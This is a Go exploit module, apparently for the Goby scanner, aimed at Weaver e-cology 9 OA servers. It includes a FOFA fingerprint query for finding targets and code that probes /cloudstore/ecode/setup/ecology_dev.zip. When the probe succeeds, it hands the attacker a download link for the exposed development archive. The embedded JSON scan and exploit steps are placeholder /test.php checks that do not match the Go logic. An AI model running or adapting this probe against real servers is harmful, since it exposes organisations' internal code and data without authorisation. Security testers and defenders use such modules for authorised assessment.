package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
	"errors"
)

func init() {
	expJson := `{
    "Name": "Weaver-OA(E-COLOGY 9) /ecology_dev.zip Information Disclosure Vulnerability",
    "Description": "<p>E-cology is a large-scale enterprise collaborative management platform with the functions of enterprise information portal, knowledge document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management and data center, and can form a series of general solutions and industry solutions.  </p><p>There is an information leakage vulnerability in the MICROECOLOGY 9 system, in which an attacker can construct a special URL address to read ecology_dev.zip files.</p>",
    "Product": "Weaver-OA(E-COLOGY)",
    "Homepage": "https://www.weaver.com.cn/",
    "DisclosureDate": "2024-08-01",
    "PostTime": "2024-08-01",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "GobyQuery": "(header=\"testBanCookie\" || banner=\"testBanCookie\" || body=\"/wui/common/css/w7OVFont.css\" || (body=\"typeof poppedWindow\" && body=\"client/jquery.client_wev8.js\") || body=\"/theme/ecology8/jquery/js/zDialog_wev8.js\" || body=\"ecology8/lang/weaver_lang_7_wev8.js\")",
    "Level": "0",
    "Impact": "<p>An attacker can construct a special URL to read ecology_dev.zip file.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "ecology_dev.zip",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Information Disclosure",
        "HW-2024"
    ],
    "VulType": [
        "Information Disclosure"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "3.0",
    "Translation": {
        "CN": {
            "Name": "泛微ecology 9 /ecology_dev.zip 信息泄露漏洞",
            "Product": "泛微-OA（e-cology）",
            "Description": "<p>泛微协同管理应用平台(e-cology)是一套兼具企业信息门户、知识文档管理、工作流程管理、人力资源管理、客户关系管理、项目管理、财务管理、资产管理、供应链管理、数据中心功能的企业大型协同管理平台，并可形成一系列的通用解决方案和行业解决方案。&nbsp;</p><p>泛微ecology 9系统存在信息泄露漏洞，攻击者通过构造特殊URL地址，可以读取ecology_dev.zip文件。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>攻击者通过构造特殊URL地址，可以读取ecology_dev.zip文件。<br></p>",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "Weaver-OA(E-COLOGY 9) /ecology_dev.zip Information Disclosure Vulnerability",
            "Product": "Weaver-OA(E-COLOGY)",
            "Description": "<p>E-cology is a large-scale enterprise collaborative management platform with the functions of enterprise information portal, knowledge document management, workflow management, human resource management, customer relationship management, project management, financial management, asset management, supply chain management and data center, and can form a series of general solutions and industry solutions.&nbsp;&nbsp;</p><p>There is an information leakage vulnerability in the MICROECOLOGY 9 system, in which an attacker can construct a special URL address to read ecology_dev.zip files.<br></p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>An attacker can construct a special URL to read ecology_dev.zip file.<br></p>",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10982"
}`
	postOrGet_ascheqcyubf3y2ygf7bc2tfcg23d := func(hostInfo *httpclient.FixUrl, fileUrl string) (string, error) {
		respTxt := ""
		// 注意：返回值为（最终要返回的读取结果，错误）
		requestConfig := httpclient.NewRequestConfig("HEAD", "/cloudstore/ecode/setup/ecology_dev.zip")
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig);
		if err != nil || resp.StatusCode != 200{
			//新建一个错误
			return "",errors.New("failed to request")
		}
		respTxt = resp.HeaderString.String()
		return respTxt, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 此处需要修改：设置成功后的vulurl
			vulURL := "/cloudstore/ecode/setup/ecology_dev.zip"
			// 此处需要修改：字典键为请求的URL地址，值为返回包判断成功的条件
			defaultModeMap := map[string]string{
				"/cloudstore/ecode/setup/ecology_dev.zip": "application/zip",
			}
			// 函数继承
			uploadFileFunc := postOrGet_ascheqcyubf3y2ygf7bc2tfcg23d

			// 请注意：后续代码为模板代码，非特殊情况，无需更改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			for fileUrl, fileText := range defaultModeMap {
				resp, err := uploadFileFunc(u, fileUrl)
				if err != nil {
					continue
				}
				if strings.Contains(resp, fileText) {
					// 设置VULURL
					ss.VulURL = u.HostInfo + vulURL
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var fileUrl string
			var fileText string
			mode := goutils.B2S(ss.Params["mode"])

			// 此处需要修改：字典键为用户选择读取文件的类型，值是一个数组，分别为请求的URL地址，返回包判断成功的条件
			defaultModeMap := map[string][2]string{
				"ecology_dev.zip": {"/cloudstore/ecode/setup/ecology_dev.zip", "application/zip"},
			}
			// 此处需要修改：函数继承
			uploadFileFunc := postOrGet_ascheqcyubf3y2ygf7bc2tfcg23d

			// 请注意，后续代码为模板固化，正常情况下均无需修改
			// ----------------------------------------------------------------------------------------------------------------------------------------------------
			if mode == "Customize" {
				fileUrl = goutils.B2S(ss.Params["Customize"])
			} else {
				if _, ok := defaultModeMap[mode]; ok {
					fileUrl = defaultModeMap[mode][0]
					fileText = defaultModeMap[mode][1]
				} else {
					expResult.Success = false
					return expResult
				}
			}

			// 获取返回结果url和返回请求头
			resp, err := uploadFileFunc(expResult.HostInfo, fileUrl)
			if err != nil || (!strings.Contains(resp, fileText) && mode != "Customize") {
				expResult.Success = false
				return expResult
			}

			expResult.Success = true
			resp = "Please visit the following URL to download ecology_dev.zip:\r\n"+expResult.HostInfo.FixedHostInfo+"/cloudstore/ecode/setup/ecology_dev.zip"
			expResult.Output = resp
			return expResult
		},
	))
}
